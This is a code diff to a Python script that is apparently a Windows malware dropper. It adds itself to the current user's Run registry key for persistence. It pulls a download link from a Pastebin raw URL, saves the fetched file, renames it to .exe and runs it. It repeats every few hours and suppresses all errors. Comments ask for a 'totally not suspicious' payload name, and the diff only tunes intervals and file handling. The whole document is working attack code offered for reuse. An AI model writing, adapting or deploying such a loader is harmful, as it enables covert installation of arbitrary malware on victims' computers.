@@ -4,8 +4,6 @@ import os
 import shutil
 import winreg
 import time
-
-
 # import random
 # from string import ascii_uppercase, digits
 
@@ -40,10 +38,9 @@ def insert_to_startup():
         # Create the key since it does not exist
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
 
-    """
     # FIX MULTIPLE INSTANCE (Fixed below by checking which dir we are running from)
     # make 6 letters of random string
-    random_string = ''.join(random.choice(ascii_uppercase + digits) for _ in range(6))
+    """random_string = ''.join(random.choice(ascii_uppercase + digits) for _ in range(6))
     winreg.SetValueEx(key, random_string, 0, winreg.REG_SZ,
                       f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")"""
     # Set the value on Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -59,14 +56,23 @@ def download_payload(file_name, delete_before_trying):
         except FileNotFoundError:
             pass
     # Get the download link from the server
-    d = requests.get(r"Change this to the pastebin link")  # Syntax: "<https://pastebin.com/raw/...>"
+    d = requests.get(r"")  # ENTER RAW PASTEBIN LINK HERE TO REDIRECT TO YOUR DIRECT DOWNLOAD LINK
     # Download the file and save it to the same dir as the script
     r = requests.get(d.text, allow_redirects=True)
 
-    with open(f"{file_name}.txt", "wb") as f:
-        f.write(r.content)
+    if os.path.isfile(f"{file_name}.txt"):
+        with open(f"{file_name}.txt", "wb") as f:
+            f.write(r.content)
+    else:
+        open(f"{file_name}.txt", "w").close()
+
+        with open(f"{file_name}.txt", "wb") as f:
+            f.write(r.content)
+
 
     # change it to .exe
+    if os.path.isfile(f"{file_name}.exe"):
+        os.remove(f"{file_name}.exe")
     os.rename(f"{file_name}.txt", f"{file_name}.exe")
 
     # run the exe and kill cmd task
@@ -79,17 +85,14 @@ first_run = True
 while True:
     try:
         # check if it's run in C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs
-        # We'll be using first_run var here incase it is the injection point so completely 0 duplicates.
         if os.getcwd() != os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs" and first_run is True:
             insert_to_startup()
             first_run = False
     except Exception:  # NOQA
         pass
-
     try:
-        # Syntax: "<name>"
         download_payload(file_name="put a totally not suspicious name here", delete_before_trying=True)
-    except Exception:  # NOQA (No Quality Assurance, suppressed the warning)
+    except Exception as e:  # NOQA (No Quality Assurance, suppressed the warning)
         pass
-
-    time.sleep(3 * 60 * 60)  # Currently 3 hrs for every rerun, change the 3 to any amount for hrs per rerun
+    
+    time.sleep(4 * 60 * 60)  # 4 hours
